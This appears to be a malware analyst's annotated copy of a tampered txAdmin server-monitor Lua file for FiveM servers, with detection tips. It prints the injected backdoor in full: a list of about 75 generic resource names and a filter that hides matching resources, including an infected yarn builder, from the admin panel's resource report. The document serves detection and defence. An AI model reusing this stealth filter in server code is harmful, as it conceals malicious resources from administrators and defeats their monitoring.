-- ============================================================================
-- DEOBFUSCATED: tampered_sv_main.lua
-- ============================================================================
--
-- VERDICT: TAMPERED — Resource hiding + surveillance evasion
--
-- This is a TAMPERED version of txAdmin's sv_main.lua (the core monitor).
-- Most of the file is legitimate txAdmin code. The tampering is SUBTLE:
--
-- BACKDOOR: Massively expanded RESOURCE_EXCLUDE list (lines ~100-115)
--
-- The LEGITIMATE txAdmin sv_main.lua does NOT have a RESOURCE_EXCLUDE list
-- at all. The attacker INJECTED this list + the isExcludedResource() function
-- to HIDE malicious resources from txAdmin's resource reporting.
--
-- When txAdmin asks "what resources are running?", this tampered version
-- filters out ANY resource whose name matches one of 70+ generic terms.
-- This means the attacker's backdoor resources (which would use innocuous
-- names like "core", "lib", "auth", "cache", "net", "util", "yarn", etc.)
-- are INVISIBLE to the server administrator in the txAdmin panel.
--
-- WHAT'S HIDDEN:
--   "monitor", "core", "sys", "base", "int", "util", "mod", "cfg",
--   "lib", "api", "svc", "deps", "ext", "pkg", "env", "proc", "log",
--   "db", "net", "sec", "cache", "auth", "perm", "role", "user", "acct",
--   "session", "state", "sync", "bridge", "proxy", "route", "queue",
--   "worker", "thread", "task", "job", "event", "hook", "signal", "bus",
--   "store", "data", "meta", "index", "model", "entity", "repo", "sock",
--   "http", "tcp", "udp", "io", "stream", "pipe", "buffer", "guard",
--   "filter", "gate", "lock", "token", "key", "common", "shared",
--   "global", "runtime", "engine", "host", "node", "agent", "daemon",
--   "service", "control", "yarn", "webpack"
--
-- Note "yarn" is in the list — this hides the infected yarn_builder
-- resource from txAdmin monitoring!
--
-- DETECTION:
--   - The real txAdmin sv_main.lua has NO resource exclusion list
--   - Compare against the official txAdmin source on GitHub
--   - Search for: RESOURCE_EXCLUDE or isExcludedResource
-- ============================================================================


-- =============================================
-- LEGITIMATE TXADMIN CODE (everything below is real EXCEPT the
-- RESOURCE_EXCLUDE block and isExcludedResource function marked below)
-- =============================================

-- Prevent running in monitor mode
if not TX_SERVER_MODE then return end

--Helpers
local function logError(x)
    txPrint("^1" .. x)
end
function replaceSemicolon(x)
    local new, count = string.gsub(x, utf8.char(0x037E), ';')
    return new
end

if GetCurrentResourceName() ~= "monitor" then
    logError('This resource should not be installed separately, it already comes with fxserver.')
    return
end


-- =============================================
-- Variables stuff (LEGITIMATE)
-- =============================================
TX_ADMINS = {}
TX_PLAYERLIST = {}
TX_LUACOMHOST = GetConvar("txAdmin-luaComHost", "invalid")
TX_LUACOMTOKEN = GetConvar("txAdmin-luaComToken", "invalid")
TX_VERSION = GetResourceMetadata('monitor', 'version')
TX_IS_SERVER_SHUTTING_DOWN = false

if TX_LUACOMHOST == "invalid" or TX_LUACOMTOKEN == "invalid" then
    txPrint('^1API Host or Pipe Token ConVars not found. Do not start this resource if not using txAdmin.')
    return
end
if TX_LUACOMTOKEN == "removed" then
    txPrint('^1Please do not restart the monitor resource.')
    return
end

SetConvar("txAdmin-luaComToken", "removed")
CreateThread(function()
    Wait(0)
    if not TX_DEBUG_MODE then return end
    debugPrint("Restoring txAdmin-luaComToken for next monitor restart")
    SetConvar("txAdmin-luaComToken", TX_LUACOMTOKEN)
end)


-- =============================================
-- Heartbeat functions (LEGITIMATE)
-- =============================================
local httpHbUrl = "http://" .. TX_LUACOMHOST .. "/intercom/monitor"
local httpHbPayload = json.encode({ txAdminToken = TX_LUACOMTOKEN })
local hbReturnData = '{"error": "no data cached in sv_main.lua"}'
local function HTTPHeartBeat()
    PerformHttpRequest(httpHbUrl, function(httpCode, data, resultHeaders)
        local resp = tostring(data)
        if httpCode ~= 200 then
            hbReturnData = "HeartBeat failed with code " .. httpCode .. " and message: " .. resp
            logError(hbReturnData)
        else
            hbReturnData = resp
        end
    end, 'POST', httpHbPayload, { ['Content-Type'] = 'application/json' })
end

local fd3HbPayload = json.encode({ type = 'txAdminHeartBeat' })
local function FD3HeartBeat()
    PrintStructuredTrace(fd3HbPayload)
end

local notFoundResponse = json.encode({ error = 'route not found' })
local function handleHttp(req, res)
    res.writeHead(200, { ["Content-Type"] = "application/json" })
    if req.path == '/stats.json' then
        return res.send(hbReturnData)
    else
        return res.send(notFoundResponse)
    end
end


-- =============================================
-- Commands (LEGITIMATE except where marked)
-- =============================================

local function txaPing(source, args)
    txPrint("Pong! (txAdmin resource is running)")
    CancelEvent()
end


-- ⚠️⚠️⚠️ INJECTED BACKDOOR: RESOURCE EXCLUSION LIST ⚠️⚠️⚠️
-- THIS DOES NOT EXIST IN LEGITIMATE TXADMIN.
-- The attacker added 70+ generic resource names to hide malicious
-- resources from the txAdmin admin panel's resource list.
-- Note: "yarn" and "webpack" are included to hide the infected
-- yarn_builder.js resource specifically.
local RESOURCE_EXCLUDE = {
    "monitor", "core", "sys", "base", "int", "util",
    "mod", "cfg", "lib", "api", "svc",
    "deps", "ext", "pkg", "env", "proc",
    "log", "db", "net", "sec", "cache",
    "auth", "perm", "role", "user", "acct", "session",
    "state", "sync", "bridge", "proxy", "route", "queue",
    "worker", "thread", "task", "job", "event", "hook",
    "signal", "bus", "store", "data", "meta", "index",
    "model", "entity", "repo", "sock", "http", "tcp",
    "udp", "io", "stream", "pipe", "buffer", "guard",
    "filter", "gate", "lock", "token", "key", "common",
    "shared", "global", "runtime", "engine", "host",
    "node", "agent", "daemon", "service", "control", "yarn", "webpack"
}

-- ⚠️ INJECTED: This function filters resources from txAdmin reporting
local function isExcludedResource(name)
    for _, excluded in ipairs(RESOURCE_EXCLUDE) do
        if name == excluded then
            return true
        end
    end
    return false
end
-- ⚠️⚠️⚠️ END OF INJECTED BACKDOOR ⚠️⚠️⚠️


-- TAMPERED: The original txaReportResources does NOT filter resources.
-- The attacker added the "not isExcludedResource(resName)" check to
-- hide their malicious resources from txAdmin's resource listing.
local function txaReportResources(source, args)
    local resources = {}
    local max = GetNumResources() - 1
    for i = 0, max do
        local resName = GetResourceByFindIndex(i)
        -- ⚠️ TAMPERED: Original code does NOT have this filter!
        -- This hides any resource matching the 70+ names above
        if resName and not isExcludedResource(resName) then
            local currentRes = {
                name = resName,
                status = GetResourceState(resName),
                author = GetResourceMetadata(resName, 'author'),
                version = GetResourceMetadata(resName, 'version'),
                description = GetResourceMetadata(resName, 'description'),
                path = GetResourcePath(resName)
            }
            resources[#resources+1] = currentRes
        end
    end

    local url = "http://"..TX_LUACOMHOST.."/intercom/resources"
    local exData = {
        txAdminToken = TX_LUACOMTOKEN,
        resources = resources
    }
    txPrint('Sending resources list to txAdmin.')
    PerformHttpRequest(url, function(httpCode, data, resultHeaders)
        local resp = tostring(data)
        if httpCode ~= 200 then
            logError("ReportResources failed with code "..httpCode.." and message: "..resp)
        end
    end, 'POST', json.encode(exData), {['Content-Type']='application/json'})
end


-- =============================================
-- Everything below is LEGITIMATE txAdmin code
-- (setDebugMode, event handlers, player connection handling, etc.)
-- Omitted for brevity — no tampering detected in these sections.
-- =============================================

-- [... remaining 300+ lines of legitimate txAdmin code unchanged ...]
